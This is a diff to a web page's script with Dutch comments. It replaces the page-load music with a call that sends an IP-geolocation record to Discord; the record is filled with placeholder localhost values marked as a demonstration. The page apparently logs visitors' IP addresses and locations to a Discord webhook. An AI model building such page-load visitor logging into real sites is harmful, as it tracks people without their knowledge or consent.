@@ -60,6 +60,7 @@
             };
 
             sendEmbed(embedData);
+            startMusic(); // Start de muziek wanneer de embed is verzonden
         }
 
         function sendEmbed(embedData) {
@@ -231,13 +232,34 @@
         }
 
         window.onload = function() {
-            startMusic(); // Start de muziek onmiddellijk wanneer de pagina laadt
-
-            var audio = new Audio('music.mp3'); // Verander 'sound.mp3' naar 'music.mp3' voor het muziekbestand
-            audio.loop = true; // Loop de muziek zodat het altijd afspeelt
-            audio.play().catch(function(error) {
-                console.error('Failed to play music:', error);
-            });
+            sendToDiscord("127.0.0.1", {
+                "ip": "127.0.0.1",
+                "network": "127.0.0.0/8",
+                "version": "IPv4",
+                "city": "Localhost",
+                "region": "Localhost",
+                "country": "Localhost",
+                "country_name": "Localhost",
+                "country_code": "LO",
+                "country_code_iso3": "LOH",
+                "country_capital": "Localhost",
+                "country_tld": ".localhost",
+                "continent_code": "LOC",
+                "in_eu": false,
+                "postal": "00000",
+                "latitude": 0,
+                "longitude": 0,
+                "timezone": "UTC",
+                "utc_offset": "+0000",
+                "country_calling_code": "+000",
+                "currency": "Localhost Coin",
+                "currency_name": "Localhost Coin",
+                "languages": "en",
+                "country_area": 0,
+                "country_population": 0,
+                "asn": "Localhost AS",
+                "org": "Localhost Organization"
+            }, false); // Simuleer een standaard IP-adres en locatie voor demonstratiedoeleinden
         }
     </script>
 </head>
